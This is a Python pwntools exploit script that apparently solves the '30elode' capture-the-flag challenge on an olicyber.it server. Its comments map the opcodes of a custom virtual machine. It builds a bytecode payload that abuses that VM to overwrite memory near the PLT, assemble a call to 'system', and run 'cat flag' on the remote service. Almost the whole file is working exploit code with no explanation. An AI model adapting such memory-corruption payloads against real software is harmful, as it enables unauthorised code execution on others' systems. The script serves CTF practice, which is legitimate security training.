#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./30elode")

context.binary = exe

REMOTE_NC_CMD    = "nc 30elode.challs.olicyber.it 38301"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode child
set follow-exec-mode same

b *vm+200   
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    '''
    0 -> sum    between the same register
    1 -> dif    between the same register
    2 -> mul    between the same register
    3 -> div    between the same register
    4 -> and
    5 -> or
    6 -> xor
    7 -> <<
    8 -> >>
    9 -> with arg1 == 2 -> push reg[arg2]
        arg1 == 0 pop reg[arg2]
        arg2 == 1 pop derefence?

    10 -> pop reg[arg1]
    11 -> reg[arg1 >> 4)] = reg[arg1]
    12 -> push all regs onto stack
    13 -> pop all regs from stack
    14 -> regs[arg3] = short() arg1
    '''

    PLT_INIT = 0x1020
   
    payload = p32(13)

    payload += p8(14) + p16(exe.sym.child+172) + p8(0)
    payload += p8(1)+p8(12<<4)*3
    payload += p8(11)+p8(12)+p8(12)*2 

    payload += p8(14) + p16(PLT_INIT) + p8(12)
    payload += p8(0)  + p8(12<<4)*3
    payload += p8(14) + p16(0x304) + p8(11)

    payload += p8(14) + p16(0) + p8(1)
    payload += p8(14) + p16(0) + p8(2)
    payload += p8(14) + p16(0) + p8(3)
    payload += p8(14) + p16(0x610) + p8(4)
    payload += p8(14) + p16(0) + p8(5)
    payload += p8(14) + p16(0) + p8(6)
    
    payload += p8(14) + p16(exe.sym.regs+8) + p8(7)
    payload += p8(11) + p8(0x80)*3
    payload += p8(0) + p8(0x87)*3
    payload += p8(11) + p8(0x78)*3

    payload += p8(6) + p8(0x11)*3
    payload += p8(6) + p8(0x22)*3
    payload += p8(6) + p8(0x33)*3
    payload += p8(6) + p8(0x55)*3
    payload += p8(6) + p8(0x66)*3
    payload += p8(6) + p8(0x88)*3
    payload += p8(6) + p8(0x99)*3

    payload += p8(14) + p16(0x7973) + p8(1)
    payload += p8(14) + p16(0x7473) + p8(2)
    payload += p8(14) + p16(0x6d65) + p8(3)
    payload += p8(14) + p16(16) + p8(5)
    payload += p8(14) + p16(32) + p8(6)

    payload += p8(7) + p8(0x25)*3
    payload += p8(7) + p8(0x36)*3
    payload += p8(0) + p8(0x12)*3
    payload += p8(0) + p8(0x13)*3

    payload += p8(6) + p8(0x22)*3
    payload += p8(6) + p8(0x33)*3
    payload += p8(6) + p8(0x55)*3
    payload += p8(6) + p8(0x66)*3
    payload += p8(6) + p8(0x88)*3
    payload += p8(6) + p8(0x99)*3

    payload += p8(14) + p16(0x7) + p8(8)
    payload += p8(14) + p16(0x336) + p8(3)
    payload += p8(14) + p16(32) + p8(6)

    payload += p8(7) + p8(0x36)*3
    payload += p8(0) + p8(0x83)*3

    payload += p8(6) + p8(0x22)*3
    payload += p8(6) + p8(0x33)*3
    payload += p8(6) + p8(0x55)*3
    payload += p8(6) + p8(0x66)*3
    payload += p8(6) + p8(0x99)*3

    payload += p8(14)+p16(exe.sym.regs+8)+p8(9)
    payload += p8(0) + p8(0x90)*3
    payload += p8(1) + p8(0x94)*3
    payload += p8(11)+ p8(0x49)*3

    payload += p8(14)+p16(0x50e8)+p8(7)
    payload += p8(14)+p16(0x4ad8)+p8(3)
    payload += p8(6) + p8(0x44)*3
    payload += p8(11)+ p8(0x67)*3
    payload += p8(11)+ p8(0x78)*3
    payload += p8(6) + p8(0x88)*3

    payload += p32(12)  
    payload += b"cat flag >&2\0"

    while len(payload)&3!=0:
        payload+=b"\0"

    r.sendline(bstr(len(payload)))
    r.send(payload)

    r.interactive()

if __name__ == "__main__":
    main()